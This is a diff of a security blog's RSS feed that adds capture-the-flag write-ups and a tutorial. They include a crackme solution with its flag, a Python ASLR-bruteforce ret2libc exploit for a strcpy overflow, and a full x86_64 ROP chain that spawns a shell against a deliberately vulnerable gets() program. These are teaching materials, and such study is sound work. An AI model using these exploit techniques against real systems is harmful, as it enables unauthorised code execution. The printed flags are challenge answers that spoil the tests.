+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009b2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function is very simple. First it call the function “passwordBeautifyier” at line +19 with the tested password as parameter and then it compare the return value of “passwordBeautifyier” with the goal password. The compared password is “cyber@hack” but the problem is the “passwordBeautifyier” function because it mix the current password so we can’t just enter “cyber@hack” as program parameter.&lt;/p&gt;
+
+&lt;p&gt;To solve the problem, I choose the lazy solution, instead of disassemble the “passwordBeautifyier” function I test different value and checked my result. After different test, I get the value “-ccyyybberr@@hhaacckk+” which seems to match with the goal password. Let’s try it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./crackme &lt;span class=&quot;nt&quot;&gt;-ccyyybberr&lt;/span&gt;@@hhaacckk+
+Good one &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; You can validate the chall with : flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;W3lC0M3_t0_CYb3R@H4Ck&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+&lt;h1 id=&quot;5-robot-cop&quot;&gt;5. Robot cOP&lt;/h1&gt;
+&lt;p&gt;This one was an exploit challenge. Let’s check the binary:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Robot_cOP 
+Robot_cOP: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5da4c256b34d973d0ff80aff762a9d443c9aadb9, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; Robot_cOP 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 meffre_q meffre_q 5.4K Sep 21 22:40 Robot_cOP
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; Robot_cOP 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	Robot_cOP
+
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./Robot_cOP 
+Only Inspector Gadget, can use Robot cOP
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./Robot_cOP toto
+
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nm Robot_cOP
+...
+         U system@@GLIBC_2.0
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the binary seems to be basic. It is a 32 bits elf dinamycally compiled and we can see thanks to “nm” the system LibC function so maybee the program use it somewhere. Let’s disassemble it!&lt;/p&gt;
+
+&lt;p&gt;After checking the “main” function, the most important things is the call to “my_bad” function. You can see below the disassembled code:&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my_bad&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my_bad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048483&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048486&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x808&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0804848c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0804848f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048492&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x808&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048498&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x08048499&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048310&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0804849e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x080484a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;leave&lt;/span&gt;  
+   &lt;span class=&quot;mh&quot;&gt;0x080484a2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function is very easy. First it allocate 0x808 (2056) bytes on the stack, then push the first argument which is the first program argument, then load the address of the allocated buffer, push that buffer and then copy the first program argument into the buffer. So if we give to strcpy a buffer greater than 0x808 bytes we will overflow the return adress.&lt;/p&gt;
+
+&lt;p&gt;Instead of using the ROP technic to solve the challenge, I choose a very fast one which I described in a &lt;a href=&quot;/pwn/2017/05/14/aslr_bruteforce.html&quot;&gt;previous post&lt;/a&gt;, the ASLR bruteforce! As I already explained it in details in my previous post, I will only show you the final exploit:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# coding: utf-8&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf754e000&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;# base libc address's&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0003e3e0&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# system offset function&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000311b0&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;# exit offset function&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x804825c&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;# /bin/sh  addresse's contained in the binary&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# final system address's&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# final exit address's&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2060&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/challenges/robot_cop/Robot_cOP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;KO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we test:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python /tmp/brute.py
+KO
+
+KO
+
+KO
+...
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1310&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot_cop-solved&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1305&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot_cop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1305&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot_cop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tocttou&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1306&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2befree&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1307&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic_rop&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1311&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;botoxedstring&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1312&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fakemalware-killswitch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1334&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dagger&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
+flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0r5t7hvR4dfTyhj67yKLO&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+</description>
+				<pubDate>Tue, 26 Sep 2017 00:00:00 +0100</pubDate>
+				<link>/write-up/2017/09/26/cyber@hack.html</link>
+				<guid isPermaLink="true">/write-up/2017/09/26/cyber@hack.html</guid>
+			</item>
+		
+			<item>
 				<title>Basic Shellcode</title>
 				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
@@ -461,6 +1074,139 @@ KO
 				<pubDate>Sun, 14 May 2017 00:00:00 +0100</pubDate>
 				<link>/pwn/2017/05/14/aslr_bruteforce.html</link>
 				<guid isPermaLink="true">/pwn/2017/05/14/aslr_bruteforce.html</guid>
+			</item>
+		
+			<item>
+				<title>[Return Oriented Programming] Easy method</title>
+				<description>&lt;p&gt;Tools:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;objdump&lt;/li&gt;
+  &lt;li&gt;ROPgadget&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Binary protection:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Read Only relocations&lt;/li&gt;
+  &lt;li&gt;No exec stack&lt;/li&gt;
+  &lt;li&gt;No exec heap&lt;/li&gt;
+  &lt;li&gt;ASLR&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Compilation: Static&lt;/p&gt;
+
+&lt;p&gt;Architecture: x86_64&lt;/p&gt;
+
+&lt;p&gt;Operating System: Linux (Debian)&lt;/p&gt;
+
+&lt;p&gt;#1. Vulnerable binary
+For this exemple, I will take a very simple code.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;cpp&quot;&gt;#include &lt;stdio.h&gt;
+
+// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
+int main()
+{
+  char buf[64];
+
+  gets(buf);  // Never use this this function !
+  printf(&quot;%s&quot;, buf);
+  return 0;
+}
+&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
+Like you can see, the vulnerability is near the gets function. As the gets function does not control the size of the input data, we will easily can pass an exploit thanks to the ROP method.
+
+#2. To begin
+Our goal is to get a shell. For this, I choose to use the execve syscall.
+
+For remind: 
+int execve(const char *filename, char *const argv[], char *const envp[]);  RAX = 59
+
+So we will have:
+RDI = &quot;/bin//sh&quot;
+RSI = NULL
+RDX = NULL
+RAX = 59
+
+#3. Payload construction
+To construct our payload, we will first need to set RSI (the filename arg of execve) to the string &quot;/bin//sh&quot;. (double slash because of 64 bits architecture)
+We will use the @data section to store our string. To get the data section address we will use objdump:
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ objdump -D a.out | grep data
+...
+Disassembly of section .data:
+00000000006b4000 &lt;__data_start&gt;:
+...
+&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
+Ok, now we need the gadget to set RDI register.
+
+We will need the following gadget:
+pop rdi, to set RSI address point to the data section.
+pop rsi, to store tempararily the data section address. (because the binary does not contain &quot;mov qword ptr [rdi], rax ; ret&quot; gadget)
+pop rax, to store temporarily the string &quot;/bin//sh&quot;.
+mov QWORD PTR [rsi], rax, to move the string to the address pointed by rsi. (the data section address)
+
+Thanks to ROPgadget, it's very easy to locate the gadget:
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ ROPgadget --binary a.out| egrep 'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'
+...
+0x000000000045f491 : mov qword ptr [rsi], rax ; ret
+0x00000000004314ad : pop rax ; ret
+0x00000000004016b7 : pop rsi ; ret
+0x000000000040159b : pop rdi ; ret
+...&lt;/code&gt;&lt;/pre&gt;
+After multiple test, I found 72 of padding before rewrite RIP.
+So our payload will begin like this:
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;p = 'A'*72
+p += pack('&amp;lt;Q', 0x00000000004016b7) # pop rsi ; ret
+p += pack('&amp;lt;Q', 0x00000000006b4000) # adress of the data section
+p += pack('&amp;lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += '/bin//sh'
+p += pack('&amp;lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
+p += pack('&amp;lt;Q', 0x000000000040159b) # pop rdi ; ret
+p += pack('&amp;lt;Q', 0x00000000006b4000) # adress of the data section&amp;lt;/pre&amp;gt;&lt;/code&gt;
+
+So now we just have to repeat this step for the next two arguments.
+We will have:
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;p += pack('&amp;lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
+p += pack('&amp;lt;Q', 0x0000000000000000) # set rdx to NULL
+p += pack('&amp;lt;Q', 0x0000000000000000) # set rsi to NULL&lt;/code&gt;&lt;/pre&gt;
+The last step is to set RAX to 59 (the number of execve syscall) and call the &quot;syscall&quot; instruction.
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;p += pack('&amp;lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += pack('&amp;lt;Q', 0x000000000000003b) # Set rax to 59
+p += pack('&amp;lt;Q', 0x0000000000454515) # syscall ; ret&lt;/code&gt;&lt;/pre&gt;
+
+#4. Exploitation
+The whole payload:
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python2
+
+from struct import pack
+
+p = 'A'*72 # padding
+
+p += pack('&amp;lt;Q', 0x00000000004016b7) # pop rsi ; ret
+p += pack('&amp;lt;Q', 0x00000000006b4000) # address of data section
+p += pack('&amp;lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += '/bin//sh'
+p += pack('&amp;lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
+
+p += pack('&amp;lt;Q', 0x000000000040159b) # pop rdi ; ret
+p += pack('&amp;lt;Q', 0x00000000006b4000) # address of data section
+p += pack('&amp;lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
+p += pack('&amp;lt;Q', 0x0000000000000000) # set rdx to 0
+p += pack('&amp;lt;Q', 0x0000000000000000) # set rsi to 0
+p += pack('&amp;lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += pack('&amp;lt;Q', 0x000000000000003b) # Set rax to 59
+p += pack('&amp;lt;Q', 0x0000000000454515) # syscall ; ret
+
+print p&lt;/code&gt;&lt;/pre&gt;
+
+Now we test:
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ (python2 rop.py; cat) | ./a.out
+id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)&amp;lt;/pre&amp;gt;&lt;/code&gt;
+Done.
+&lt;/pre&gt;&lt;/pre&gt;&lt;/__data_start&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/stdio.h&gt;&lt;/code&gt;&lt;/pre&gt;
+</description>
+				<pubDate>Wed, 25 Jan 2017 00:00:00 +0000</pubDate>
+				<link>/pwn/2017/01/25/easy_method.html</link>
